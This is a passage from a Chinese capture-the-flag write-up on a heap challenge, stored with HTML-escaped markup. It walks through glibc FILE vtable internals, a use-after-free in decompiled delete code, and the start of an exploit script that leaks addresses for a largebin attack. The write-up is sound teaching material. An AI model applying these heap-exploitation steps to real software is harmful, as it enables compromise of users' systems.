class=&#34;line&#34;&gt;  __write = &lt;span class=&#34;number&#34;&gt;0x7f2b2d43cf40&lt;/span&gt; &amp;lt;_IO_new_file_write&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __seek = &lt;span class=&#34;number&#34;&gt;0x7f2b2d43c6f0&lt;/span&gt; &amp;lt;__GI__IO_file_seek&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __close = &lt;span class=&#34;number&#34;&gt;0x7f2b2d43c610&lt;/span&gt; &amp;lt;__GI__IO_file_close&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __stat = &lt;span class=&#34;number&#34;&gt;0x7f2b2d43cf30&lt;/span&gt; &amp;lt;__GI__IO_file_stat&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __showmanyc = &lt;span class=&#34;number&#34;&gt;0x7f2b2d4414a0&lt;/span&gt; &amp;lt;_IO_default_showmanyc&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __imbue = &lt;span class=&#34;number&#34;&gt;0x7f2b2d4414b0&lt;/span&gt; &amp;lt;_IO_default_imbue&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;我们看到这里对应的入口点就是 xsputn。当__malloc_assert 进行 __fxprintf 调用的时候，进行错误输出的时候，&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__fxprintf  ————》》&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;locked_vfxprintf  ————》》&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__vfprintf_internal 	————》》		//0x7f6fb038d15d &amp;lt;__vfprintf_internal+173&amp;gt;    call   *ABS*+0xab090@plt &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__strchrnul_avx2;ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__libc_cleanup_push_defer;ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x7f6fb038d1c8 &amp;lt;__vfprintf_internal+280&amp;gt;    call   qword ptr [r12 + 0x38]	//调用目标函数&amp;lt;__GI__IO_wfile_seekoff&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;下面我们直接来看题目&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#下面我们直接来看题目&#34;&gt;#&lt;/a&gt; 下面我们直接来看题目。&lt;/h3&gt;
&lt;p&gt;开始的逆向过程就不再赘述。&lt;/p&gt;
&lt;p&gt;程序确实实现了增删改查的功能，但是对于改的次数做出了严格的限制，只允许进行两次更改，而且程序没有结束功能，也就是说，我们如果想利用 io 必须触发报错__malloc_assert。由于我们只有两次修改的机会，那么其实我们已经想好了怎么做，一次用来出发报错，一次用来伪造 io 结构。&lt;/p&gt;
&lt;p&gt;我们来看程序的实现，&lt;/p&gt;
&lt;h4 id=&#34;add&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#add&#34;&gt;#&lt;/a&gt; add&lt;/h4&gt;
&lt;p&gt;在创建的 chunk 的时候，最多允许我们创建 16 个 cat，并且对 size 的大小进行了限制&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;size &amp;lt;= &lt;span class=&#34;number&#34;&gt;0x417&lt;/span&gt; || size &amp;gt; &lt;span class=&#34;number&#34;&gt;0x46F&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;只允许的 largebin 范围的堆块的创建&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 idx; &lt;span class=&#34;comment&#34;&gt;// [rsp+0h] [rbp-10h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; size; &lt;span class=&#34;comment&#34;&gt;// [rsp+8h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  writen(&lt;span class=&#34;string&#34;&gt;&amp;quot;plz input your cat idx:\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  idx = getint();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( idx &amp;gt; &lt;span class=&#34;number&#34;&gt;0xF&lt;/span&gt; || &lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;[idx] )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    writen(&lt;span class=&#34;string&#34;&gt;&amp;quot;invalid!\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    writen(&lt;span class=&#34;string&#34;&gt;&amp;quot;plz input your cat size:\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    size = getint();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( size &amp;lt;= &lt;span class=&#34;number&#34;&gt;0x417&lt;/span&gt; || size &amp;gt; &lt;span class=&#34;number&#34;&gt;0x46F&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      writen(&lt;span class=&#34;string&#34;&gt;&amp;quot;invalid size!\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;[idx] = &lt;span class=&#34;built_in&#34;&gt;calloc&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1uLL&lt;/span&gt;, size);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( &lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;[idx] )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        size_list[idx] = size;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        writen(&lt;span class=&#34;string&#34;&gt;&amp;quot;plz input your content:\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        read(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;[idx], size_list[idx]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        writen(&lt;span class=&#34;string&#34;&gt;&amp;quot;error!\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;同时，因为使用 了 calloc 函数，会对我们申请出来的 chunk 进行一个初始化。read 允许我们输入空字符。&lt;/p&gt;
&lt;p&gt;接下来我们看看删除&lt;/p&gt;
&lt;h4 id=&#34;delete&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#delete&#34;&gt;#&lt;/a&gt; delete&lt;/h4&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;del&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 v0; &lt;span class=&#34;comment&#34;&gt;// [rsp+8h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  writen(&lt;span class=&#34;string&#34;&gt;&amp;quot;plz input your cat idx:\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v0 = getint();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v0 &amp;lt;= &lt;span class=&#34;number&#34;&gt;0xF&lt;/span&gt; &amp;amp;&amp;amp; &lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;[v0] )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;[v0]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    writen(&lt;span class=&#34;string&#34;&gt;&amp;quot;invalid!\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;明显的一个 uaf，可以用来泄露数据。&lt;/p&gt;
&lt;p&gt;所以我们在看下 show&lt;/p&gt;
&lt;h4 id=&#34;show&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#show&#34;&gt;#&lt;/a&gt; show&lt;/h4&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;show&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 v0; &lt;span class=&#34;comment&#34;&gt;// [rsp+8h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  writen(&lt;span class=&#34;string&#34;&gt;&amp;quot;plz input your cat idx:\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v0 = getint();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v0 &amp;lt;= &lt;span class=&#34;number&#34;&gt;0xF&lt;/span&gt; &amp;amp;&amp;amp; &lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;[v0] )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    writen(&lt;span class=&#34;string&#34;&gt;&amp;quot;Context:\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    write(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;[v0], &lt;span class=&#34;number&#34;&gt;0x30&lt;/span&gt;uLL);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    writen(&lt;span class=&#34;string&#34;&gt;&amp;quot;invalid!\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;使用 write，允许输出空字符，最多输出 0x30 字节，这已经够了，我们只要释放两个不相连的 chunk 就可以实现两地址的泄露，但是，这里要注意到，这个 uaf 的负面影响就是，我们不可以再向对应的 idx 申请 chunk，所以我们要控制数量。&lt;/p&gt;
&lt;h4 id=&#34;攻击&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#攻击&#34;&gt;#&lt;/a&gt; 攻击&lt;/h4&gt;
&lt;p&gt;简单的布局下 chunk，泄露出两个地址， 然后准备进行 largebinattack&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x450&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)     &lt;span class=&#34;comment&#34;&gt;#0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x418&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)     &lt;span class=&#34;comment&#34;&gt;#1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x430&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)     &lt;span class=&#34;comment&#34;&gt;#2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x418&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)     &lt;span class=&#34;comment&#34;&gt;#3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x440&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)     &lt;span class=&#34;comment&#34;&gt;#4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x418&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;#5&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x460&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;#6&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;chunk 的情况&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span 